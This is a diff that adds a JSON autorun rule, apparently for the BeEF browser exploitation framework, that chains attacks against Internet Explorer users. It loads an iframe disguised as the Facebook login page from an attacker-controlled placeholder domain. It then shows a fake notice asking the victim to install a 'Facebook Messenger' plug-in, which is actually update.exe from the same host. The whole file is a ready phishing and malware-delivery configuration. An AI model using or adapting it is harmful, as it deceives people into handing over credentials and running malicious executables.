@@ -1,0 +1,32 @@
+{
+  "name": "Redirect_Hashgrab_Send_Payload_IE",
+  "author": "http://www.github.com/highmeh",
+  "browser": "IE",
+  "browser_version": "ALL",
+  "os": "ALL",
+  "os_version": "ALL",
+  "modules": [
+		{ 
+	"name": "site_redirect_iframe", 
+	"condition": null,
+	"options": { 
+		"iframe_title": "Facebook - Log In or Sign Up",
+		"iframe_favicon": "favico.ico",
+		"iframe_src": "https://www.yourdomain.com/index_ie.html",
+		"iframe_timeout": "1000"
+		}
+	},
+
+	{
+	"name": "fake_notification_ie",
+	"condition": null,
+	"options": {
+		"url":"https://www.yourdomain.com/update.exe",
+		"notification_text":"Internet Explorer needs to install the following plug-in: 'Facebook Messenger' from Facebook, Inc."
+		}
+	}
+   ],
+  "execution_order": [0,1],
+  "execution_delay": [0,2000],
+  "chain_mode": "sequential"
+}
